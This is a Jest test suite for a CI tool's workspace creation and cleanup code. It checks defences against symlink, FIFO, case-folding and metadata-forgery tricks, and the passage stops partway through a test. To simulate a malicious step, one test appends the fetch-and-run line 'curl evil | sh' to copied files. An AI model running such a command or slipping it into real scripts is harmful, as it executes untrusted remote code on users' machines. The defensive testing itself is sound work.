/**
 * Creating and cleaning up workspaces on a real filesystem.
 *
 * A workspace's metadata file lives inside the workspace, which every step of
 * the run it holds can write. Cleanup used to take the directory to delete
 * from that file.
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync, spawn } from 'child_process';
import { cleanupWorkspaces, createWorkspace, getWorkspacesDir, listWorkspaces, removeWorkspace } from './workspace';

let appData: string;

beforeEach(() => {
  appData = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'ws-cleanup-')));
  process.env.LOCALMOST_CONFIG_DIR = path.join(appData, 'appdata');
  fs.mkdirSync(getWorkspacesDir(), { recursive: true });
});

afterEach(() => {
  jest.restoreAllMocks();
  delete process.env.LOCALMOST_CONFIG_DIR;
  fs.rmSync(appData, { recursive: true, force: true });
});

/** A workspace id as createWorkspace names one made at the given time. */
const idAt = (ms: number): string => `ws-${ms.toString(36)}-abc123`;

const makeWorkspace = (name: string, metadata: Record<string, unknown>) => {
  const dir = path.join(getWorkspacesDir(), name);
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, '.localmost-workspace.json'), JSON.stringify(metadata));
  return dir;
};

describe('workspace creation', () => {
  // Every workspace is listed by several runs of git, and most of these
  // build their checkout with git too. Each run is a
  // process of its own, found through xcrun, which on a loaded machine - CI
  // runs this suite inside a job, beside other jobs - takes seconds, the
  // first of a job longest while xcrun fills its cache.
  const WORKSPACE_TIMEOUT_MS = 60_000;

  it('keeps workspaces private to the user, however the directory was left', async () => {
    // A workspace is a copy of the checkout, and holds the step scripts that
    // expanded ${{ secrets.X }}. The CLI runs with the shell's umask.
    fs.chmodSync(getWorkspacesDir(), 0o755);
    const source = path.join(appData, 'src');
    fs.mkdirSync(source);
    fs.writeFileSync(path.join(source, 'README'), 'hi\n');

    const ws = await createWorkspace({ sourceDir: source, respectGitignore: false });

    expect(fs.statSync(getWorkspacesDir()).mode & 0o777).toBe(0o700);
    expect(fs.statSync(ws.path).mode & 0o777).toBe(0o700);
    expect(fs.readFileSync(path.join(ws.path, 'README'), 'utf-8')).toBe('hi\n');
  }, WORKSPACE_TIMEOUT_MS);

  /** A checkout that is a git repository, with the given files. */
  const gitCheckout = (files: Record<string, string>): string => {
    const source = path.join(appData, 'checkout');
    fs.mkdirSync(source);
    execFileSync('git', ['init', '-q'], { cwd: source });
    for (const [name, content] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(source, name)), { recursive: true });
      fs.writeFileSync(path.join(source, name), content);
    }
    return source;
  };

  /** Every path in a tree, relative to it, directories marked with a slash. */
  const tree = (dir: string, rel = ''): string[] =>
    fs.readdirSync(path.join(dir, rel), { withFileTypes: true }).flatMap((entry) => {
      const name = rel ? `${rel}/${entry.name}` : entry.name;
      return entry.isDirectory() ? [`${name}/`, ...tree(dir, name)] : [name];
    });

  it('is a private copy of the checkout: a step that writes a workspace file does not write the checkout', async () => {
    // The step profile grants writes on the workspace. A hard-linked
    // workspace shared every file's inode with the checkout, so a step - a
    // third-party action among them - appended to the user's own build.sh.
    const source = gitCheckout({ 'sub/build.sh': 'make\n', '.localmostrc': 'version: 1\n' });
    fs.chmodSync(path.join(source, 'sub', 'build.sh'), 0o755);
    fs.chmodSync(path.join(source, 'sub'), 0o750);
    const outside = path.join(appData, 'outside');
    fs.writeFileSync(outside, 'the user\'s\n');
    fs.symlinkSync(outside, path.join(source, 'link'));
    // A FIFO in the checkout is neither copied nor waited on.
    execFileSync('mkfifo', [path.join(source, 'pipe')]);

    for (const respectGitignore of [true, false]) {
      const ws = await createWorkspace({ sourceDir: source, respectGitignore });

      for (const name of ['sub/build.sh', '.localmostrc']) {
        fs.appendFileSync(path.join(ws.path, name), 'curl evil | sh\n');
        expect(fs.statSync(path.join(ws.path, name)).nlink).toBe(1);
        expect(fs.statSync(path.join(source, name)).nlink).toBe(1);
      }
      expect(fs.readFileSync(path.join(source, 'sub', 'build.sh'), 'utf-8')).toBe('make\n');
      expect(fs.readFileSync(path.join(source, '.localmostrc'), 'utf-8')).toBe('version: 1\n');
      expect(fs.statSync(path.join(ws.path, 'sub', 'build.sh')).mode & 0o777).toBe(0o755);
      expect(fs.statSync(path.join(ws.path, 'sub')).mode & 0o777).toBe(0o750);
      // A link is copied as the link, never as what it points to.
      expect(fs.readlinkSync(path.join(ws.path, 'link'))).toBe(outside);
      expect(fs.existsSync(path.join(ws.path, 'pipe'))).toBe(false);
    }
  }, WORKSPACE_TIMEOUT_MS);

  it('never reads the checkout\'s .gitignore as rsync filter rules', async () => {
    // To git a line that is only "!" is nothing; to rsync's --exclude-from
    // it cleared every rule before it, the default .git exclude among them.
    const source = gitCheckout({
      '.gitignore': 'node_modules\n!\nsecret.env\n',
      'a.txt': 'a\n',
      'secret.env': 'TOKEN=1\n',
      'node_modules/m/index.js': 'x\n',
      'sub/b.txt': 'b\n',
      'sub/node_modules/n.js': 'x\n',
      'build.log': 'x\n',
    });
    // A repository nested in the checkout is listed by its own rules, never
    // its .git.
    execFileSync('git', ['init', '-q', path.join(source, 'nested')]);
    fs.writeFileSync(path.join(source, 'nested', 'n.txt'), 'n\n');

    const ws = await createWorkspace({ sourceDir: source });

    expect(tree(ws.path).sort()).toEqual(
      ['.gitignore', '.localmost-workspace.json', 'a.txt', 'nested/', 'nested/n.txt', 'sub/', 'sub/b.txt'].sort()
    );

    // Without the ignore rules every file is copied, but never .git or
    // node_modules.
    const all = await createWorkspace({ sourceDir: source, respectGitignore: false });
    expect(tree(all.path)).toEqual(expect.arrayContaining(['secret.env', 'a.txt', 'nested/n.txt']));
    expect(tree(all.path).filter((p) => /(^|\/)(\.git|node_modules)(\/|$)/.test(p))).toEqual([]);
  }, WORKSPACE_TIMEOUT_MS);

  it('applies a checkout\'s .gitignore as git does when the checkout is not a repository', async () => {
    const source = path.join(appData, 'plain');
    fs.mkdirSync(path.join(source, '.git'), { recursive: true });
    fs.writeFileSync(path.join(source, '.git', 'config'), '[core]\n\tbare = false\n');
    fs.writeFileSync(path.join(source, '.gitignore'), 'ignored.txt\n!\n');
    fs.writeFileSync(path.join(source, 'ignored.txt'), 'x\n');
    fs.writeFileSync(path.join(source, 'kept.txt'), 'k\n');

    const ws = await createWorkspace({ sourceDir: source });

    expect(tree(ws.path).sort()).toEqual(['.gitignore', '.localmost-workspace.json', 'kept.txt']);
  }, WORKSPACE_TIMEOUT_MS);

  it('refuses to create a workspace whose ignore rules it cannot read, rather than copy what they exclude', async () => {
    const source = path.join(appData, 'plain');
    fs.mkdirSync(source);
    fs.writeFileSync(path.join(source, '.gitignore'), '.env\n');
    fs.writeFileSync(path.join(source, '.env'), 'TOKEN=1\n');
    // No git on this Mac.
    jest.spyOn(jest.requireActual<typeof import('child_process')>('child_process'), 'execFileSync').mockImplementation(() => {
      throw Object.assign(new Error('spawnSync git ENOENT'), { code: 'ENOENT' });
    });

    await expect(createWorkspace({ sourceDir: source })).rejects.toThrow(/--no-ignore/);
  }, WORKSPACE_TIMEOUT_MS);

  it('writes its metadata into the workspace, never through a link the checkout put at its name', async () => {
    // The checkout is copied first, its links as links; the metadata was
    // then written through whatever was at its name, by this unsandboxed
    // process.
    const victim = path.join(appData, 'victim');
    fs.writeFileSync(victim, 'the user\'s\n');
    const source = gitCheckout({ 'a.txt': 'a\n' });
    fs.symlinkSync(victim, path.join(source, '.localmost-workspace.json'));

    for (const respectGitignore of [true, false]) {
      const ws = await createWorkspace({ sourceDir: source, respectGitignore });

      expect(fs.readFileSync(victim, 'utf-8')).toBe('the user\'s\n');
      expect(fs.lstatSync(path.join(ws.path, '.localmost-workspace.json')).isFile()).toBe(true);
      expect(JSON.parse(fs.readFileSync(path.join(ws.path, '.localmost-workspace.json'), 'utf-8')).id).toBe(ws.id);
    }
  }, WORKSPACE_TIMEOUT_MS);

  it("copies no checkout entry at the runner temp or tool cache, which are the run's to make", async () => {
    // `localmost test` makes both before the first step: a committed one
    // failed every run with EEXIST, and a committed link went into the
    // guest as the steps' temp.
    const victim = path.join(appData, 'victim');
    fs.mkdirSync(victim);
    const source = path.join(appData, 'steps-dirs');
    fs.mkdirSync(source);
    git(source, 'init', '-q');
    fs.writeFileSync(path.join(source, 'a.txt'), 'a\n');
    fs.symlinkSync(victim, path.join(source, '.runner-temp'));
    fs.mkdirSync(path.join(source, '.RUNNER-TOOL-CACHE'));
    fs.writeFileSync(path.join(source, '.RUNNER-TOOL-CACHE', 'planted'), 'x\n');
    fs.mkdirSync(path.join(source, 'sub', '.runner-temp'), { recursive: true });
    fs.writeFileSync(path.join(source, 'sub', '.runner-temp', 'file'), 'kept\n');
    git(source, 'add', '-A');

    for (const options of [{ respectGitignore: true }, { respectGitignore: false }, { stagedOnly: true }]) {
      const ws = await createWorkspace({ sourceDir: source, ...options });

      expect([options, fs.readdirSync(ws.path).sort()]).toEqual([options, ['.localmost-workspace.json', 'a.txt', 'sub']]);
      // Only the workspace's top level is the run's; one deeper in is the checkout's own.
      expect(fs.readFileSync(path.join(ws.path, 'sub', '.runner-temp', 'file'), 'utf-8')).toBe('kept\n');
      expect(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf-8')).toBe('a\n');
    }
  }, WORKSPACE_TIMEOUT_MS);

  it.each([
    ['in another case', '.LOCALMOST-WORKSPACE.JSON'],
    ['with a long s, which APFS folds to s', '.localmoſt-workspace.json'],
  ])('neither fails nor writes through a checkout entry named as its metadata %s', async (_, name) => {
    // The volume takes the name for the metadata's, which the exclude, by
    // the exact name, did not: the entry was copied first, and the metadata
    // write after it either failed the run or went through the link.
    const victim = path.join(appData, 'victim');
    fs.writeFileSync(victim, 'the user\'s\n');
    const source = path.join(appData, 'folded');
    fs.mkdirSync(source);
    git(source, 'init', '-q');
    fs.writeFileSync(path.join(source, 'a.txt'), 'a\n');
    fs.symlinkSync(victim, path.join(source, name));
    git(source, 'add', 'a.txt', name);

    for (const options of [{ respectGitignore: true }, { respectGitignore: false }, { stagedOnly: true }]) {
      const ws = await createWorkspace({ sourceDir: source, ...options });

      expect(fs.readFileSync(victim, 'utf-8')).toBe('the user\'s\n');
      expect(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf-8')).toBe('a\n');
      const metadata = path.join(ws.path, '.localmost-workspace.json');
      expect(fs.lstatSync(metadata).isFile()).toBe(true);
      expect(JSON.parse(fs.readFileSync(metadata, 'utf-8')).id).toBe(ws.id);
      // One entry, as the temp directory is on the Mac's default volume,
      // which does not tell the two names apart.
      expect(fs.readdirSync(ws.path).filter((entry) => entry.toLowerCase().endsWith('-workspace.json'))).toEqual([
        '.localmost-workspace.json',
      ]);
    }
  }, WORKSPACE_TIMEOUT_MS);

  it.each([
    ['a file in another case', '.LOCALMOST-WORKSPACE.JSON', 'file'],
    ['a file with a long s', '.localmoſt-workspace.json', 'file'],
    ['a directory in another case', '.LOCALMOST-WORKSPACE.JSON', 'directory'],
    ['a directory with a long s', '.localmoſt-workspace.json', 'directory'],
  ])('keeps its own metadata over %s the volume takes for its name', async (_, name, kind) => {
    // The copy finds the name already taken by the metadata, written first:
    // a file is copied only as a new one, and a directory is not descended,
    // so neither replaces the metadata nor puts anything in the workspace.
    // Each needs its own checkout, as the checkout's volume folds the names
    // too.
    const source = path.join(appData, 'folded');
    fs.mkdirSync(source);
    git(source, 'init', '-q');
    fs.writeFileSync(path.join(source, 'a.txt'), 'a\n');
    const entry = kind === 'file' ? name : `${name}/inner`;
    fs.mkdirSync(path.dirname(path.join(source, entry)), { recursive: true });
    fs.writeFileSync(path.join(source, entry), JSON.stringify({ id: 'forged' }));
    git(source, 'add', 'a.txt', entry);

    for (const options of [{ respectGitignore: true }, { respectGitignore: false }, { stagedOnly: true }]) {
      const ws = await createWorkspace({ sourceDir: source, ...options });

      const metadata = path.join(ws.path, '.localmost-workspace.json');
      expect(fs.lstatSync(metadata).isFile()).toBe(true);
      expect(JSON.parse(fs.readFileSync(metadata, 'utf-8')).id).toBe(ws.id);
      expect(fs.readdirSync(ws.path).sort()).toEqual(['.localmost-workspace.json', 'a.txt']);
    }
  }, WORKSPACE_TIMEOUT_MS);

  it('never writes its metadata through a link already at its name, even in a directory at its own id', async () => {
    // The metadata is written into the workspace directory before anything
    // else is; a directory already at the id - two runs given the same one -
    // is refused there rather than shared, and nothing at the name is
    // written through.
    const victim = path.join(appData, 'victim');
    fs.writeFileSync(victim, 'the user\'s\n');
    const source = path.join(appData, 'src');
    fs.mkdirSync(source);
    fs.writeFileSync(path.join(source, 'a.txt'), 'a\n');
    jest.spyOn(Date, 'now').mockReturnValue(1_700_000_000_000);
    jest.spyOn(Math, 'random').mockReturnValue(0.5);
    const taken = path.join(getWorkspacesDir(), `ws-${(1_700_000_000_000).toString(36)}-${(0.5).toString(36).substring(2, 8)}`);
    fs.mkdirSync(taken);
    fs.symlinkSync(victim, path.join(taken, '.localmost-workspace.json'));

    await expect(createWorkspace({ sourceDir: source, respectGitignore: false })).rejects.toThrow(/EEXIST/);

    expect(fs.readFileSync(victim, 'utf-8')).toBe('the user\'s\n');
    expect(fs.existsSync(path.join(taken, 'a.txt'))).toBe(false);
  }, WORKSPACE_TIMEOUT_MS);

  it('never copies through a directory of the checkout replaced by a link, however the workspace is listed', async () => {
    // A committed config/f, whose config is now a link to a directory
    // outside the checkout: git still lists config/f, and a copier that
    // looked through the link cloned what it found there.
    const outside = path.join(appData, 'outside');
    fs.mkdirSync(outside);
    fs.writeFileSync(path.join(outside, 'f'), 'SECRET\n');

    /** Every regular file in a tree, whatever is at a link. */
    const files = (dir: string): string[] =>
      fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
        const at = path.join(dir, entry.name);
        if (entry.isDirectory()) return files(at);
        return entry.isFile() ? [at] : [];
      });

    const checkouts = [
      // config listed as the untracked link it now is, beside config/f.
      { dir: 'listed', ignore: '' },
      // Only config/f listed: nothing else lays down config first.
      { dir: 'ignored', ignore: '/config\n' },
    ];
    for (const { dir, ignore } of checkouts) {
      const source = path.join(appData, dir);
      committedRepo(source, { 'a.txt': 'a\n', 'config/f': 'f\n' });
      fs.writeFileSync(path.join(source, '.gitignore'), ignore);
      fs.rmSync(path.join(source, 'config'), { recursive: true });
      fs.symlinkSync(outside, path.join(source, 'config'));
      fs.writeFileSync(path.join(source, 'b.txt'), 'b\n');
      git(source, 'add', 'b.txt');

      for (const options of [{ respectGitignore: true }, { stagedOnly: true }]) {
        const ws = await createWorkspace({ sourceDir: source, ...options });

        expect(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf-8')).toBe('a\n');
        const config = fs.lstatSync(path.join(ws.path, 'config'), { throwIfNoEntry: false });
        expect(config === undefined || config.isSymbolicLink()).toBe(true);
        expect(files(ws.path).filter((file) => fs.readFileSync(file, 'utf-8').includes('SECRET'))).toEqual([]);
      }
    }
  }, WORKSPACE_TIMEOUT_MS);

  it('copies a staged checkout\'s links as links, never what they point to', async () => {
    // A tracked link to a file of the user's put that file's contents in
    // the workspace, for every step to read.
    const secret = path.join(appData, 'id_ed25519');
    fs.writeFileSync(secret, 'PRIVATE KEY\n');
    const source = gitCheckout({ 'a.txt': 'a\n' });
    fs.symlinkSync(secret, path.join(source, 'key'));
    execFileSync('git', ['add', 'a.txt', 'key'], { cwd: source });

    const ws = await createWorkspace({ sourceDir: source, stagedOnly: true });

    expect(fs.readlinkSync(path.join(ws.path, 'key'))).toBe(secret);
    expect(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf-8')).toBe('a\n');
    expect(fs.statSync(path.join(ws.path, 'a.txt')).nlink).toBe(1);
  }, WORKSPACE_TIMEOUT_MS);

  /** Git in a test repository, as a user with a name, its chatter kept out. */
  const git = (cwd: string, ...args: string[]): void => {
    execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], { cwd, stdio: 'ignore' });
  };

  /** A repository at dir, with its files committed. */
  const committedRepo = (dir: string, files: Record<string, string>): void => {
    fs.mkdirSync(dir, { recursive: true });
    git(dir, 'init', '-q');
    for (const [name, content] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
      fs.writeFileSync(path.join(dir, name), content);
    }
    git(dir, 'add', '.');
    git(dir, 'commit', '-qm', 'files');
  };

  it('never copies a nested repository\'s .git into a staged workspace', async () => {
    // A repository added in place, as a gitlink: git lists it as its
    // directory, which was copied whole, its .git with the credential in its
    // remote's URL among it, for every step to read and write.
    const source = gitCheckout({ 'a.txt': 'a\n' });
    const nested = path.join(source, 'nested');
    committedRepo(nested, { 'n.txt': 'n\n' });
    git(nested, 'config', 'remote.origin.url', 'https://user:ghp_SECRET@github.com/o/r.git');
    git(source, 'add', 'a.txt', 'nested');

    const ws = await createWorkspace({ sourceDir: source, stagedOnly: true });

    // The submodule's directory is there, and empty, as a checkout without
    // submodules leaves it.
    expect(tree(ws.path).sort()).toEqual(['.localmost-workspace.json', 'a.txt', 'nested/']);
  }, WORKSPACE_TIMEOUT_MS);

  it('applies the checkout\'s ignore rules, and a nested repository\'s own, inside a nested repository or submodule', async () => {
    // A directory git lists - a submodule, a repository nested untracked, a
    // tracked file now a directory - was copied whole, and whatever either
    // repository's rules ignore in it, a .env say, with it.
    const source = path.join(appData, 'checkout');
    committedRepo(path.join(source, 'sub'), { 's.txt': 's\n' });
    committedRepo(source, { '.gitignore': '*.env\n', 'a.txt': 'a\n', config: 'c\n' });
    fs.writeFileSync(path.join(source, 'sub', 'prod.env'), 'TOKEN=1\n');
    const untracked = path.join(source, 'un');
    committedRepo(untracked, { '.gitignore': 'creds.json\n', 'k.txt': 'k\n' });
    fs.writeFileSync(path.join(untracked, 'x.env'), 'TOKEN=2\n');
    fs.writeFileSync(path.join(untracked, 'creds.json'), '{}\n');
    fs.writeFileSync(path.join(untracked, 'u.txt'), 'u\n');
    fs.rmSync(path.join(source, 'config'));
    fs.mkdirSync(path.join(source, 'config'));
    fs.writeFileSync(path.join(source, 'config', 'prod.env'), 'TOKEN=3\n');
    fs.writeFileSync(path.join(source, 'config', 'c.txt'), 'c\n');

    const ws = await createWorkspace({ sourceDir: source });

    expect(tree(ws.path).sort()).toEqual(
      [
        '.gitignore',
        '.localmost-workspace.json',
        'a.txt',
        'config/',
        'config/c.txt',
        'sub/',
        'sub/s.txt',
        'un/',
        'un/.gitignore',
        'un/k.txt',
        'un/u.txt',
      ].sort()
    );
  }, WORKSPACE_TIMEOUT_MS);

  it('copies the files git lists whatever Unicode form or case their names have on disk', async () => {
    // Git on a Mac lists names precomposed, and in the case its index holds;
    // a name written decomposed, or renamed only in case, was matched
    // against neither and left out, with all that was in it.
    const nfd = (name: string): string => name.normalize('NFD');
    const source = path.join(appData, 'checkout');
    committedRepo(source, {
      [nfd('café.txt')]: 'c\n',
      [`${nfd('résumé')}/f.txt`]: 'f\n',
      'Src/a.ts': 'a\n',
      'README.md': 'r\n',
    });
    fs.renameSync(path.join(source, 'Src'), path.join(source, 'src'));
    fs.renameSync(path.join(source, 'README.md'), path.join(source, 'Readme.md'));

    const ws = await createWorkspace({ sourceDir: source });

    const fold = (name: string): string => name.normalize('NFC').toLowerCase();
    expect(tree(ws.path).map(fold).sort()).toEqual(
      ['.localmost-workspace.json', 'café.txt', 'readme.md', 'résumé/', 'résumé/f.txt', 'src/', 'src/a.ts'].map(fold).sort()
    );
    expect(fs.readFileSync(path.join(ws.path, 'src', 'a.ts'), 'utf-8')).toBe('a\n');
  }, WORKSPACE_TIMEOUT_MS);

  it('lists a checkout that a repository around it ignores by the checkout\'s own rules', async () => {
    // A home directory kept as a dotfiles repository that ignores
    // everything: git answered from that repository, with nothing.
    const home = path.join(appData, 'home');
    fs.mkdirSync(home);
    git(home, 'init', '-q');
    fs.writeFileSync(path.join(home, '.gitignore'), '*\n!.gitignore\n');
    const source = path.join(home, 'proj');
    fs.mkdirSync(source);
    fs.writeFileSync(path.join(source, '.gitignore'), 'x.env\n');
    fs.writeFileSync(path.join(source, 'a.txt'), 'a\n');
    fs.writeFileSync(path.join(source, 'x.env'), 'TOKEN=1\n');

    const ws = await createWorkspace({ sourceDir: source });

    expect(tree(ws.path).sort()).toEqual(['.gitignore', '.localmost-workspace.json', 'a.txt']);
  }, WORKSPACE_TIMEOUT_MS);
});

describe('workspace cleanup', () => {
  it('deletes the workspace directory it found, never a path its metadata names', async () => {
    // A step rewrites its own workspace's metadata to point two levels up and
    // to look a day old, so the next cleanup removes it.
    const victim = path.join(appData, 'appdata', 'runner');
    fs.mkdirSync(victim, { recursive: true });
    fs.writeFileSync(path.join(victim, 'keep'), 'x');
    makeWorkspace('ws-aaaa-1111', {
      id: '../runner',
      path: victim,
      sourceDir: '/x',
      createdAt: new Date(0).toISOString(),
    });

    const { removed } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 10 });

    expect(removed).toBe(1);
    expect(fs.existsSync(path.join(victim, 'keep'))).toBe(true);
    expect(fs.existsSync(path.join(getWorkspacesDir(), 'ws-aaaa-1111'))).toBe(false);
  });

  it('lists each workspace by its directory, whatever its metadata says', () => {
    makeWorkspace('ws-bbbb-2222', { id: '../../..', path: '/', sourceDir: '/x', createdAt: new Date().toISOString() });
    const [ws] = listWorkspaces();
    expect(ws.id).toBe('ws-bbbb-2222');
    expect(ws.path).toBe(path.join(getWorkspacesDir(), 'ws-bbbb-2222'));
  });

  it('does not wait on a FIFO a step planted at its workspace\'s metadata', async () => {
    // A step replaces its metadata file with a FIFO, or with a link to one.
    // Every later run's cleanup opened it and blocked for a writer that never
    // came. Here one comes after a few seconds, so that a cleanup that waits
    // shows as slow rather than hanging the suite.
    const fifo = path.join(makeWorkspace('ws-aaaa-1111', {}), '.localmost-workspace.json');
    fs.rmSync(fifo);
    execFileSync('mkfifo', [fifo]);
    const elsewhere = path.join(appData, 'fifo');
    execFileSync('mkfifo', [elsewhere]);
    const linked = path.join(makeWorkspace('ws-bbbb-2222', {}), '.localmost-workspace.json');
    fs.rmSync(linked);
    fs.symlinkSync(elsewhere, linked);
    const writers = [fifo, elsewhere].map((p) =>
      spawn('/bin/sh', ['-c', 'sleep 4; printf "{}" > "$1"', 'sh', p], { stdio: 'ignore' })
    );

    try {
      const started = Date.now();
      const { removed } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 0 });
      expect(Date.now() - started).toBeLessThan(2000);
      expect(removed).toBe(2);
      expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
    } finally {
      for (const writer of writers) writer.kill('SIGKILL');
    }
  }, 15000);

  it('dates a workspace by its name, never by metadata a step can write', async () => {
    // A step can rewrite its workspace's metadata, remove it or put a link
    // there. A date far ahead kept its workspace - a copy of the checkout
    // and its expanded scripts - past every age limit, and sorted it first,
    // so the count limit removed the others in its place.
    const hour = 60 * 60 * 1000;
    const now = Date.now();
    const future = { sourceDir: '/x', createdAt: '2999-01-01T00:00:00Z' };
    const forged = makeWorkspace(idAt(now - 3 * hour), future);
    const missing = makeWorkspace(idAt(now - 2 * hour), future);
    fs.rmSync(path.join(missing, '.localmost-workspace.json'));
    const elsewhere = path.join(appData, 'elsewhere.json');
    fs.writeFileSync(elsewhere, JSON.stringify(future));
    const linked = makeWorkspace(idAt(now - hour), future);
    fs.rmSync(path.join(linked, '.localmost-workspace.json'));
    fs.symlinkSync(elsewhere, path.join(linked, '.localmost-workspace.json'));
    const newest = makeWorkspace(idAt(now - 1000), future);

    expect(listWorkspaces().map((ws) => [ws.id, ws.createdAt])).toEqual(
      (
        [
          [newest, now - 1000],
          [linked, now - hour],
          [missing, now - 2 * hour],
          [forged, now - 3 * hour],
        ] as Array<[string, number]>
      ).map(([dir, at]) => [path.basename(dir), new Date(at).toISOString()])
    );

    expect(await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 1 })).toEqual({ removed: 3, kept: 1 });
    expect(fs.readdirSync(getWorkspacesDir())).toEqual([path.basename(newest)]);
    expect(await cleanupWorkspaces({ maxAgeHours: 0, maxCount: 10 })).toEqual({ removed: 1, kept: 0 });
    expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
  });

  it('carries on when another run removes a workspace while this one lists them', async () => {
    // Another run's cleanup moves a workspace aside between this one's
    // listing of the directory and its look at the workspace; the error
    // failed a run whose jobs had all passed.
    const gone = makeWorkspace(idAt(Date.now()), {});
    fs.rmSync(path.join(gone, '.localmost-workspace.json'));
    const realReaddirSync = fs.readdirSync.bind(fs) as (...args: unknown[]) => unknown;
    jest.spyOn(jest.requireActual<typeof import('fs')>('fs'), 'readdirSync').mockImplementation(((...args: unknown[]) => {
      const listed = realReaddirSync(...args);
      if (args[0] === getWorkspacesDir()) fs.rmSync(gone, { recursive: true, force: true });
      return listed;
    }) as never);

    await expect(cleanupWorkspaces({ maxAgeHours: 24, maxCount: 0 })).resolves.toEqual({ removed: 0, kept: 0 });
  });

  it('refuses to remove anything that is not a workspace directory', async () => {
    const outside = path.join(appData, 'appdata', 'policies');
    fs.mkdirSync(outside, { recursive: true });
    for (const id of ['../policies', '..', '.', '', 'ws-../../policies']) {
      expect(await removeWorkspace(id)).toBe(false);
    }
    expect(await removeWorkspace('ws-cccc-3333')).toBe(false);
    expect(fs.existsSync(outside)).toBe(true);
  });
});

describe('a workspace cleanup cannot remove', () => {
  // A file flagged immutable can be neither unlinked nor moved, by the app
  // or by anyone - a removal that never clears, like the ones that would
  // otherwise leave a copy of the checkout in app data run after run. Off
  // macOS - the Linux CI leg - only root can set an immutable flag, so
  // there unlinking or moving a file named stuck is refused with EPERM, as
  // the kernel refuses one flagged on a Mac.
  const stuck = (dir: string): void => {
    fs.writeFileSync(path.join(dir, 'stuck'), 'x');
    if (process.platform === 'darwin') execFileSync('chflags', ['uchg', path.join(dir, 'stuck')]);
  };
  beforeEach(() => {
    if (process.platform === 'darwin') return;
    const refused = (op: string, p: fs.PathLike) =>
      Promise.reject(Object.assign(new Error(`EPERM: operation not permitted, ${op} '${p}'`), { code: 'EPERM' }));
    const realUnlink = fs.promises.unlink.bind(fs.promises);
    const realRename = fs.promises.rename.bind(fs.promises);
    jest.spyOn(fs.promises, 'unlink').mockImplementation((p) => (path.basename(String(p)) === 'stuck' ? refused('unlink', p) : realUnlink(p)));
    jest.spyOn(fs.promises, 'rename').mockImplementation((from, to) =>
      path.basename(String(from)) === 'stuck' ? refused('rename', from) : realRename(from, to)
    );
  });
  afterEach(() => {
    if (process.platform === 'darwin') execFileSync('chflags', ['-R', 'nouchg', getWorkspacesDir()]);
  });

  it('is named in a warning, and not counted as removed', async () => {
    const dir = makeWorkspace('ws-aaaa-1111', { sourceDir: '/x', createdAt: new Date(0).toISOString() });
    stuck(dir);
    const leftover = path.join(getWorkspacesDir(), '.removing-ws-bbbb-2222.0a1b2c3d');
    fs.mkdirSync(leftover);
    stuck(leftover);
    const warned = jest.spyOn(console, 'error').mockImplementation(() => undefined);

    const { removed, kept } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 10 });

    expect({ removed, kept }).toEqual({ removed: 0, kept: 0 });
    const said = warned.mock.calls.map((args) => args.join(' '));
    expect(said.some((line) => line.includes('ws-aaaa-1111') && line.includes('EPERM'))).toBe(true);
    expect(said.some((line) => line.includes('.removing-ws-bbbb-2222.0a1b2c3d') && line.includes('EPERM'))).toBe(true);
  });
});

describe('removing a workspace something of its run still writes', () => {
  // A step's leftover process - one that outlived the CLI's reap - still
  // writes its workspace's path, and a container a step started writes the
  // workspace it bind-mounts under no profile at all. Either can swap a
  // directory in the tree for a link while the removal walks it.
  let victim: string;

  beforeEach(() => {
    victim = path.join(appData, 'victim');
    fs.mkdirSync(victim);
    fs.writeFileSync(path.join(victim, 'keep'), 'kept');
  });

  const workspace = (id: string): string => {
    const dir = makeWorkspace(id, { sourceDir: '/x', createdAt: new Date(0).toISOString() });
    fs.mkdirSync(path.join(dir, 'd0', 'src'), { recursive: true });
    fs.writeFileSync(path.join(dir, 'd0', 'src', 'output'), 'step');
    return dir;
  };

  /** Each call made to the fs.promises functions a removal could use, in order. */
  const recordRemovalCalls = (): Array<{ op: string; paths: string[] }> => {
    const calls: Array<{ op: string; paths: string[] }> = [];
    for (const op of ['rename', 'rm', 'readdir', 'opendir', 'lstat', 'stat', 'unlink', 'rmdir'] as const) {
      const real = fs.promises[op].bind(fs.promises) as (...args: unknown[]) => Promise<unknown>;
      jest.spyOn(fs.promises, op).mockImplementation(((...args: unknown[]) => {
        calls.push({ op, paths: args.filter((arg): arg is string => typeof arg === 'string') });
        return real(...args);
      }) as never);
    }
    return calls;
  };

  it('moves the workspace out of its path before removing it, and never walks the tree by path', async () => {
    const dir = workspace('ws-aaaa-1111');
    const base = getWorkspacesDir();
    const calls = recordRemovalCalls();

    expect(await removeWorkspace('ws-aaaa-1111')).toBe(true);

    // The one call that names the workspace's own path moves it aside,
    // beside itself, under a name no step's profile grants.
    const touching = calls.filter(({ paths }) => paths.some((p) => p === dir || p.startsWith(`${dir}/`)));
    expect(touching).toHaveLength(1);
    expect(touching[0].op).toBe('rename');
    const to = touching[0].paths[1];
    expect(path.dirname(to)).toBe(base);
    expect(path.basename(to).startsWith('.removing-')).toBe(true);
    // Nothing after it uses a path more than one entry below the directory
    // the tree was moved into, which only the app writes.
    for (const { op, paths } of calls) {
      expect(op).not.toBe('rm');
      for (const p of paths) {
        if (p === dir) continue;
        const rel = path.relative(base, p).split(path.sep);
        expect(rel[0].startsWith('.removing-')).toBe(true);
        expect(rel.length).toBeLessThanOrEqual(2);
      }
    }
    expect(fs.readdirSync(base)).toEqual([]);
  });

  it('never follows a link planted at the workspace, or swapped into it while it is removed', async () => {
    const dir = workspace('ws-aaaa-1111');
    fs.symlinkSync(victim, path.join(dir, 'link'));
